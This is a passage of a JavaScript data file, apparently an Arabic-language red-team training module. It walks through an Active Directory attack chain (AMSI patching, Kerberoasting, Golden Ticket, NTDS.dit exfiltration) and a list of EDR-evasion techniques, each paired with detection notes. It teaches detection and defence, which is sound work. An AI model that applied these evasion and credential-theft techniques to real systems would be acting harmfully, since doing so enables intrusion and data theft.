          detection: 'ترصد أنظمة EDR و Windows Event Logs (أحداث Sysmon Event ID 1: Process Creation) تشغيل java.exe لعمليات فرعية مثل cmd.exe أو powershell.exe أو conhost.exe، وهو نمط شاذ (Parent-Child Anomaly) يطلق تنبيهاً فورياً في الـ SIEM.',
          mitreId: 'T1059.007',
          link: 'https://attack.mitre.org/techniques/T1059/007/',
          linkText: 'توثيق تقنية تنفيذ الأوامر عبر JavaScript/Groovy في MITRE ATT&CK'
        },
        {
          phase: 'Phase 03: Evasion & Post-Exploitation',
          title: 'تجاوز AMSI بالذاكرة وتحميل أدوات فحص الدومين بصمت',
          action: 'قبل استدعاء أدوات الـ Recon الداخلية مثل PowerView، تم تطبيق تقنية In-Memory Patching لدالة AmsiScanBuffer داخل مكتبة amsi.dll عبر تعديل بايتات الفحص الأولى لترجع القيمة 0x80070057 (E_INVALIDARG)، مما عطل حماية AMSI بالكامل داخل الجلسة الحالية وتمرير PowerView.ps1 دون اعتراض.',
          detection: 'ترصد أنظمة EDR المتقدمة (عبر Kernel Callbacks و VirtualProtect Hooks) استدعاء WriteProcessMemory أو VirtualProtect على منطقة الذاكرة الخاصة بـ amsi.dll، وتوليد تنبيه Sysmon Event ID 10 (ProcessAccess) و Event ID 25 (Process Tampering) وسجلات PowerShell Script Block Logging (Event ID 4104).',
          mitreId: 'T1562.001',
          link: 'https://amsi.fail/',
          linkText: 'أداة وبحث amsi.fail لتقنيات دراسة وتجاوز وفحص AMSI'
        },
        {
          phase: 'Phase 04: Active Directory Enumeration',
          title: 'رسم خرائط الصلاحيات واكتشاف مسار السيطرة بـ BloodHound',
          action: 'تم تشغيل SharpHound كـ Assembly في الذاكرة لتجميع بيانات الـ Active Directory دون كتابة ملفات على القرص. أظهر التحليل في BloodHound مسار هجوم حاسم: حساب خدمة mssql-svc يمتلك GenericAll على جروب IT-Admins، والذي يمتلك بدوره عضوية مباشرة في Domain Admins.',
          detection: 'ترصد سجلات الـ Domain Controller استعلامات LDAP و SAMR المكثفة وغير الطبيعية (أحداث Windows Event ID 1644: LDAP Search queries)، وتنبيهات برمجية على حجم الاستعلامات القادمة من محطة عمل واحدة خلال فترة زمنية وجيزة.',
          mitreId: 'T1069.002',
          link: 'https://bloodhound.readthedocs.io/en/latest/',
          linkText: 'التوثيق الرسمي لأداة BloodHound وطرق تحليل مسارات Active Directory'
        },
        {
          phase: 'Phase 05: Credential Harvesting',
          title: 'تنفيذ Kerberoasting واستخراج وكسر تذكرة TGS للحساب المستهدف',
          action: 'باستخدام أداة Rubeus، تم إرسال طلب تذكرة Kerberos TGS لحساب mssql-svc الذي يمتلك SPN مسجل (SPN-registered)، وتم استخراج الـ Ticket Hash بنجاح دون إثارة الشبهات، ثم كسر الـ Hash أوفلاين باستخدام Hashcat بنمط 13100 في أقل من 3 دقائق نظراً لضعف كلمة المرور (Autumn2024!).',
          detection: 'تسجل خوادم الـ Active Directory حدث الأمان Windows Security Event ID 4769 (A Kerberos service ticket was requested) بتشفير RC4 (Ticket Options 0x40810000 / Encryption Type 0x17)، وهو مؤشر قطعي على هجوم Kerberoasting عند استهدافه لحسابات خدمية دون اتصال فعلي بالخدمة.',
          mitreId: 'T1558.003',
          link: 'https://attack.mitre.org/techniques/T1558/003/',
          linkText: 'توثيق هجوم Kerberoasting وتحليله الدفاعي على MITRE ATT&CK'
        },
        {
          phase: 'Phase 06: Lateral Movement',
          title: 'التحرك الجانبي بالاعتماد على WinRM و Evil-WinRM',
          action: 'باستخدام بيانات الاعتماد المستخرجة لحساب mssql-svc، تم إنشاء جلسة إدارة عن بُعد عبر منفذ Windows Remote Management (Port 5985/5986) للوصول إلى الخادم الوسيط jump-server، ومنه تصعيد الصلاحيات محلياً واستخدام صلاحية GenericAll لإضافة الحساب إلى مجموعة Domain Admins.',
          detection: 'يتم الرصد عبر مراقبة أحداث تسجيل الدخول الشبكي Windows Event ID 4624 (Logon Type 3: Network) مع اسم الحزمة Kerberos أو NTLM، وسجلات خدمة WinRM (Microsoft-Windows-WinRM/Operational Event ID 6)، ومراقبة الاتصالات الشبكية على البورتين 5985 و 5986.',
          mitreId: 'T1021.006',
          link: 'https://www.ired.team/offensive-security/lateral-movement/interactive-winrm-session-via-evil-winrm',
          linkText: 'دليل ired.team لتكتيكات التحرك الجانبي عبر WinRM والبروتوكولات الإدارية'
        },
        {
          phase: 'Phase 07: Persistence',
          title: 'تثبيت الوصول الاستراتيجي وتوليد تذكرة كيربيروس الذهبية (Golden Ticket)',
          action: 'بعد الوصول للـ Domain Controller بصلاحيات Domain Admin، تم استخراج NTLM Hash الخاص بحساب krbtgt، واستخدام أداة Impacket Ticketer لتوليد Kerberos TGT تذكرة ذهبية صالحة لمدة 10 سنوات تمنح صلاحيات Enterprise Admin على كامل الغابة (Forest).',
          detection: 'يكشف فريق الدفاع الـ Golden Ticket برصد أحداث Event ID 4624/4672 بأوقات صلاحية غير منطقية تفوق العمر الافتراضي لتذاكر TGT (10 ساعات)، ومطابقة رقم الـ Kerberos Key Version Number (kvno) للتذكرة مع المسجل في الـ Active Directory، ورصد محاولات سحب هاش krbtgt عبر DCSync (Event ID 4662).',
          mitreId: 'T1558.001',
          link: 'https://adsecurity.org/?p=1515',
          linkText: 'بحث وفحص Sean Metcalf المعمق حول تذاكر Golden Ticket وكيفية اكتشافها'
        },
        {
          phase: 'Phase 08: Crown Jewels & Data Exfiltration',
          title: 'سحب قاعدة بيانات الدومين NTDS.dit عبر VSS وتصديرها مشفرة',
          action: 'باستخدام أداة ntdsutil أو Volume Shadow Copy (VSS)، تم أخذ لقطة سريعة لملف C:\\Windows\\NTDS\\ntds.dit ومفتاح الـ SYSTEM Registry Hive، ثم ضغط البيانات وتشفيرها بمفتاح AES-256 ونقلها عبر قناة C2 مشفرة متطابقة مع بروتوكول HTTPS عبر CDN خارجي.',
          detection: 'ترصد أنظمة SOC استدعاء أوامر vssadmin create shadow / ntdsutil (أحداث Sysmon Event ID 1)، والوصول المباشر لملفات NTDS.dit (Event ID 4663)، والارتفاع المفاجئ في حركة البيانات الصادرة (Outbound Traffic Anomaly) عبر جدار الحماية (Firewall/Proxy Logs).',
          mitreId: 'T1003.003 / T1048',
          link: 'https://attack.mitre.org/techniques/T1003/003/',
          linkText: 'توثيق تقنيات استخراج NTDS.dit وحمايتها على MITRE ATT&CK'
        },
        {
          phase: 'Phase 09: Cleanup & Professional Reporting',
          title: 'إزالة الآثار وتقديم تقرير المحاكاة التنفيذي والتقني',
          action: 'قام الفريق بمسح الملفات المؤقتة، وإزالة حسابات الاختبار، وإنهاء جلسات الـ C2، وتوثيق Timeline دقيق لكل خطوة بالدقيقة والثانية مع الـ Hashes والأوامر والـ IoCs، وتقديم تقرير تنفيذي للقيادة وتقرير تقني مفصل لفريق SOC لسد الثغرات وتحسين آليات الرصد.',
          detection: 'يقوم فريق الدفاع بمراجعة سجلات الـ SIEM ومقارنتها بالـ Attack Timeline (Purple Teaming) للتحقق من أي الخطوات نجحت أدوات الدفاع في رصدها وأيها مر دون تنبيه لتطوير قواعد Sigma و Yara جديدة.',
          mitreId: 'T1070',
          link: 'https://0xdf.gitlab.io/',
          linkText: 'نماذج وأمثلة لتقارير ورايت أبس Red Team من الباحث 0xdf'
        }
      ],
      lessonLearned: 'أضعف نقطة كانت Jenkins بـ default credentials — ثغرة بسيطة أدت لاختراق كامل. الدفاع المتعدد الطبقات (Defense in Depth) هو الحل: لو كان فيه MFA على Jenkins + Network Segmentation + Credential Rotation، كان الاختراق توقف من أول خطوة.'
    },
    secretTradecraft: [
      {
        title: 'انتحال معرّف العملية الأب (Parent PID Spoofing)',
        mitreId: 'T1134.004',
        category: 'Defense Evasion & Privilege Escalation',
        explanation: 'تعتمد أنظمة EDR على فحص العلاقة بين الـ Parent Process والـ Child Process (مثل رصد cmd.exe أو powershell.exe التي يتم إطلاقها من word.exe). في هذه الخدعة، يتم استخدام دالة Windows API المسماة UpdateProcThreadAttribute مع المعامل PROC_THREAD_ATTRIBUTE_PARENT_PROCESS لتعيين explorer.exe أو svchost.exe كأب زائف للعملية المشبوهة، مما يكسر شجرة العمليات في شاشات المراقبة التقليدية.',
        detection: 'يرصد الـ SOC وفرق التحقيق الجنائي هذه التقنية عبر مقارنة الـ Process Creation Token مع الـ Parent Process Token، ومطابقة سجلات Sysmon Event ID 1 التي تسجل الـ Real Parent والـ Injected/Spoofed Parent، بالإضافة إلى رصد استدعاء OpenProcess بصلاحيات PROCESS_CREATE_PROCESS على عمليات نظام حساسة.',
        link: 'https://ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing',
        linkText: 'دليل ired.team التفصيلي لتنفيذ وكشف Parent PID Spoofing برمجياً'
      },
      {
        title: 'تشفير الذاكرة أثناء وضع السكون (Sleep Obfuscation - Ekko / Foliage)',
        mitreId: 'T1027',
        category: 'In-Memory Evasion & Payload Protection',
        explanation: 'تقوم حلول EDR الحديثة (مثل Defender for Endpoint و CrowdStrike) بإجراء دورات فحص دورية لذاكرة العمليات (Memory Scanners) للبحث عن بصمات Beacons و Shellcode. تقنية Sleep Obfuscation تقوم بتشفير الـ Memory Region (باستخدام RC4 أو AES) وتغيير تصريح الـ Memory Protection من RWX/RX إلى RW أثناء فترة السكون (Sleep)، ثم استخدام ROP Chains ومؤقتات غير متزامنة (Waitable Timers) لفك التشفير فقط للحظة الاستيقاظ والتواصل مع الـ C2.',
        detection: 'ترصد حلول EDR المتقدمة عبر تقنيات فحص Stack Walking للتحقق من صحة عناوين العودة (Return Addresses) في مسار استدعاء دوال السكون، ورصد مؤقتات غير مألوفة، وكشف الـ Memory Pages التي تتحول دورياً بين PAGE_READWRITE و PAGE_EXECUTE_READ.',
        link: 'https://github.com/Cracked5pider/Ekko',
        linkText: 'مستودع مشروع Ekko الشهير لشرح وتطبيق تقنيات Sleep Obfuscation'
      },
      {
        title: 'استخدام الخدمات السحابية المشروعة كقنوات C2 (Living Off Trusted Platforms)',
        mitreId: 'T1102.002',
        category: 'Command and Control & Traffic Evasion',
        explanation: 'بدلاً من حجز Domains جديدة ومحاولة بناء سمعة Reputation لها لتجاوز الـ Web Proxies، يتم توجيه حركة التحكم C2 عبر واجهات برمجة التطبيقات (APIs) لخدمات موثوقة عالمياً مثل GitHub Gists، أو Notion API، أو Discord Webhooks، أو Microsoft Graph. نظراً لأن حركة هذه النطاقات مشروعة ومشفرة بالكامل عبر SSL ومرخصة في كل الشركات، فإن جدران الحماية تسمح بمرورها تلقائياً.',
        detection: 'يرصد الـ SOC هذه الحركة من خلال تحليل السلوك الشبكي (Behavioral Analytics) لمعدل ونمط استدعاء الـ APIs، ورصد اتصالات خارج ساعات العمل من أجهزة ومستخدمين لا علاقة لهم بأعمال البرمجة أو التطوير، ومطابقة الـ User-Agent والـ HTTP Headers غير المعتادة.',
        link: 'https://attack.mitre.org/techniques/T1102/',
        linkText: 'توثيق تقنيات استغلال الخدمات السحابية للقيادة والتحكم في MITRE ATT&CK'
      },
      {
        title: 'سحب أسرار النظام عبر واجهات DPAPI بدلاً من قراءة ذاكرة LSASS',
        mitreId: 'T1555.004',
        category: 'Credential Access & OpSec-Safe Harvesting',
        explanation: 'محاولة قراءة أو عمل Dump لذاكرة عملية lsass.exe تُعتبر أحد أكبر الأخطاء العملياتية (OpSec Blunder) لأن كل أنظمة EDR تضع Hooks صارمة على استدعاءات OpenProcess و MiniDumpWriteDump وتطلق تنبيهاً فورياً. البديل الأهدأ هو استخراج الـ Master Keys من واجهة Data Protection API (DPAPI) لقراءة كلمات المرور والشهادات والـ Tokens المحفوظة في متصفحات Chrome و Edge وخزائن %APPDATA%\\Microsoft\\Credentials عبر استدعاءات CryptUnprotectData المشروعة.',
        detection: 'ترصد فرق المراقبة استدعاءات CryptUnprotectData المكثفة من عمليات مجهولة أو سكريبتات PowerShell، ومراقبة الوصول لملفات MasterKey في المسار %APPDATA%\\Microsoft\\Protect (أحداث Sysmon Event ID 11: FileCreate و Event ID 4663).',
        link: 'https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi/',
        linkText: 'بحث HarmJ0y المرجعي حول الدليل العملياتي لاستخدام DPAPI في Red Teaming'
      },
      {
        title: 'الاستدعاء المباشر وغير المباشر لخدمات النواة (Direct & Indirect Syscalls)',
        mitreId: 'T1106',
        category: 'Defense Evasion & Anti-EDR Hooking',
        explanation: 'تقوم معظم برمجيات EDR بتثبيت Inline Hooks (تغيير أول بايتات بتعليمة JMP) في دوال ntdll.dll لمراقبة استدعاءات الذاكرة مثل NtAllocateVirtualMemory و NtWriteVirtualMemory. لتجاوز هذه الحلقات، يقوم المهاجم باستخراج رقم الـ System Service Number (SSN) ديناميكياً (مثل Hell\'s Gate أو HalosGate) وتنفيذ تعليمة syscall مباشرة من داخل كوده، أو استخدام Indirect Syscalls للقفز إلى تعليمة syscall الموجودة بداخل ntdll الشرعية للحفاظ على صحة الـ Call Stack.',
        detection: 'يتم رصد الـ Syscalls المشبوهة عبر آليات حماية النواة (Kernel Callbacks) مثل PsSetCreateProcessNotifyRoutine، وميزات معالجات Intel/AMD الحديثة (Hardware Telemetry / Intel PT / CET)، وسجلات ETW Threat Intelligence (ETW-TI) التي تسجل تنفيذ الـ Syscall من الـ Kernel بغض النظر عن محاولات إخفائه في الـ User-Mode.',
        link: 'https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls',
        linkText: 'مقال تحليلي وبحثي شامل يقارن بين Direct و Indirect Syscalls وكيفية رصدها'
      },
      {
        title: 'مراوغة فحص الشبكات وتقنية إخفاء النطاقات (Domain Fronting & CDN Camouflage)',
        mitreId: 'T1090.004',
        category: 'Command and Control & Network Evasion',
        explanation: 'تعتمد هذه التقنية على الاستفادة من شبكات توزيع المحتوى (CDNs) مثل Cloudflare أو Fastly أو Azure CDN؛ حيث يتم ضبط الـ TLS SNI (Server Name Indication) ليتجه لنطاق ذو سمعة عالية ومصرح به في الشركة (مثل office.com)، بينما يحتوي الـ HTTP Host Header الداخلي على النطاق الحقيقي لخادم الـ C2. وبما أن الـ CDN يفك تشفير الـ SSL في طرفه، فإنه يوجه الطلب للـ Host الداخلي بينما يرى جدار حماية الشركة اتصالاً عادياً بالـ CDN.',
        detection: 'يرصد مسؤولو الشبكات والـ SOC هذه التقنية من خلال تفعيل خاصية TLS/SSL Decryption (Inspection) على أجهزة الـ Next-Gen Firewall (NGFW) لفحص الـ HTTP Host Header الداخلي ومقارنته بالـ SNI، مع حظر الاتصالات التي يظهر فيها عدم تطابق (SNI / Host Mismatch).',
        link: 'https://attack.mitre.org/techniques/T1090/004/',
        linkText: 'توثيق تقنية Domain Fronting وطرق كشفها وإحباطها على MITRE ATT&CK'
      }
    ],
    checklist: [
      { id: 'c20_1', text: 'فهم مراحل Cyber Kill Chain السبعة وتطبيقها عملياً على بيئة معملية.' },
      { id: 'c20_2', text: 'فهم آلية عمل AMSI وكيفية تجاوزها نظرياً وعملياً.' },
      { id: 'c20_3', text: 'فهم تقنية Process Injection واحدة على الأقل (DLL Injection أو Process Hollowing).' },
      { id: 'c20_4', text: 'استخدام أداة ScareCrow أو مشابهة لإنشاء payload يتجاوز AV/EDR.' },
      { id: 'c20_5', text: 'تنفيذ Full Kill-Chain على بيئة Active Directory — من Initial Access لحد Domain Admin.' },
      { id: 'c20_6', text: 'كتابة تقرير ريد تيم احترافي كامل يشمل كل المراحل والتوصيات.' }
    ],
    officialResources: [
      { name: 'MITRE ATT&CK Framework — Enterprise Tactics', url: 'https://attack.mitre.org/matrices/enterprise/', type: 'Framework' },
      { name: 'Red Team Notes by 0xdf', url: 'https://0xdf.gitlab.io/', type: 'Writeups' },
      { name: 'ired.team — Red Team Techniques', url: 'https://www.ired.team/', type: 'Cheatsheet' },
      { name: 'HackTricks — Pentesting Methodology', url: 'https://book.hacktricks.xyz/', type: 'Guide' },
      { name: 'Maldev Academy', url: 'https://maldevacademy.com/', type: 'Course' },
      { name: 'ScareCrow — EDR Bypass Loader Generator', url: 'https://github.com/optiv/ScareCrow', type: 'Tool' }
    ]
  }
];
